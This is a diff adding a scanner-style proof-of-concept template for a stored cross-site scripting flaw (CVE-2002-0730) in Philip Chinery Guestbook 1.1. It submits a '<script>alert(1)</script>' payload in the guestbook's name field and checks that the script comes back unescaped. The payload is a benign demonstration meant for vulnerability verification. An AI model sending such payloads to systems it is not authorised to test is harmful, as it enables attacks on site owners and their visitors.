@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "向 Philip Chinery Guestbook 1.1 的 guestbook.pl 提交包含 XSS 载荷的留言，验证 Name/Email/Homepage 字段未对 HTML 进行转义导致存储型跨站脚本执行"
+id = "POC-AVE-2002-0400"
+name = "Philip Chinery Guestbook 1.1 存储型 XSS PoC"
+severity = "high"
+tags = [
+    "cve-2002-0730",
+    "xss",
+    "guestbook",
+]
+vuln_id = [
+    "CVE-2002-0730",
+    "AVE-2002-0400",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/guestbook.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = "name=<script>alert(1)</script>&email=test@test.com&homepage=http://test.com&comments=test"
+type = "form"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<script>alert(1)</script>"]
